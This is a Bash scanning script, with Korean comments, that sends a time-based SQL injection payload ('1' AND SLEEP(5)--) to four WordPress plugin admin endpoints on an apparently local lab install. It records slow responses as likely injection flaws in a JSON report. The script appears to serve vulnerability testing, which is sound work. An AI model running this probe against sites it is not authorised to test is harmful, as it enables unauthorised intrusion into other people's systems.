#!/bin/bash
# 3_scan_wfuzz.sh - wfuzz 파라미터 퍼징 및 빠른 SQLi 테스트

set -e

TARGET_BASE="${TARGET_BASE:-http://localhost:8888/wordpress-zeroday}"
RESULTS_DIR="results"
OUTPUT_JSON="${RESULTS_DIR}/wfuzz_results.json"

mkdir -p "${RESULTS_DIR}"

echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "⚡ wfuzz - 파라미터 퍼징 & 빠른 SQLi"
echo "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━"
echo "Target: ${TARGET_BASE}"
echo ""

# 테스트 대상 엔드포인트
declare -A ENDPOINTS=(
    ["wps_pages_page-id"]="/wp-admin/admin.php?page=wps_pages_page&id="
    ["wps_overview-user_id"]="/wp-admin/admin.php?page=wps_overview&user_id="
    ["wps_categories-category_id"]="/wp-admin/admin.php?page=wps_categories&category_id="
    ["wps_pages-page_id"]="/wp-admin/admin.php?page=wps_pages&page_id="
)

# JSON 시작
echo '{
  "scan_type": "parameter_fuzzing",
  "tool": "wfuzz",
  "target": "'${TARGET_BASE}'",
  "timestamp": "'$(date -u +"%Y-%m-%dT%H:%M:%SZ")'",
  "results": [' > "${OUTPUT_JSON}"

first=true
vuln_count=0

for name in "${!ENDPOINTS[@]}"; do
    endpoint="${ENDPOINTS[$name]}"
    param=$(echo "$name" | cut -d'-' -f2)
    
    echo "Testing: ${name}"
    echo "  Endpoint: ${endpoint}"
    
    # Time-based SQLi 테스트
    echo "  Testing time-based SQLi..."
    start=$(date +%s.%N 2>/dev/null || date +%s)
    
    curl -s --max-time 10 \
        "${TARGET_BASE}${endpoint}1' AND SLEEP(5)--" > /dev/null 2>&1 || true
    
    end=$(date +%s.%N 2>/dev/null || date +%s)
    duration=$(echo "$end - $start" | bc 2>/dev/null || echo "0")
    duration_int=$(printf "%.0f" "$duration" 2>/dev/null || echo "0")
    
    echo "  Response time: ${duration}s"
    
    # 5초 이상이면 취약
    if [ "$duration_int" -ge 5 ]; then
        vuln_count=$((vuln_count + 1))
        
        if [ "$first" = false ]; then
            echo "," >> "${OUTPUT_JSON}"
        fi
        first=false
        
        echo "  🚨 Time-based SQLi 발견!"
        
        cat >> "${OUTPUT_JSON}" << EOF
    {
      "endpoint": "${name}",
      "url": "${TARGET_BASE}${endpoint}",
      "parameter": "${param}",
      "payload": "1' AND SLEEP(5)--",
      "response_time": "${duration}s",
      "vulnerability": "time-based-sqli",
      "severity": "HIGH",
      "potential_zero_day": true
    }
EOF
    else
        echo "  ✅ 안전"
    fi
    echo ""
done

# JSON 종료
echo '
  ]
}' >> "${OUTPUT_JSON}"

echo "✅ wfuzz 스캔 완료"
echo "결과: ${OUTPUT_JSON}"
echo "발견된 취약점: ${vuln_count}개"